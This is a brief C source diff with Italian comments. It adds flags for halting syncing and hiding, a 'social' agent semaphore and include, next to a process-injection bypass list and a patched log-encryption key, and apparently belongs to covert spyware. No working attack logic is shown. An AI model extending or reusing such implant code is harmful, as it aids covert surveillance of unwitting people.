@@ -58,6 +58,10 @@ DWORD log_free_space;   // Spazio a disposizione per i log
 DWORD log_active_queue; // Quale coda e' attiva 1 o 0
 DWORD process_bypassed; //Numero di processi da bypassare
 char process_bypass_list[MAX_DYNAMIC_BYPASS+EMBEDDED_BYPASS][MAX_PBYPASS_LEN]; // Lista dei processi su cui non fare injection
+DWORD social_process_control = SOCIAL_PROCESS_CONTINUE; // Semaforo per controllare il processo "social"
+BOOL network_crisis = NULL; // Se deve fermare le sync
+BOOL system_crisis = NULL;  // Se deve fermare i comandi e l'hiding
+
 // Nomi dei file di sistema.
 // Sono qui perche' ad esempio anche le funzioni di 
 // setup dei wrapper devono poterci accedere dall'interno
@@ -111,6 +115,7 @@ void UnlockConfFile();
 #include "HM_Application.h" // XXX da modificare
 #include "HM_PDAAGent.h" // XXX da modificare
 #include "HM_Contacts.h" // XXX da modificare
+#include "HM_SocialAgent.h" // XXX da modificare
 
 // Qui finira' il binary patch con la chiave di cifratura dei log
 BYTE bin_patched_key[] = ENCRYPTION_KEY;
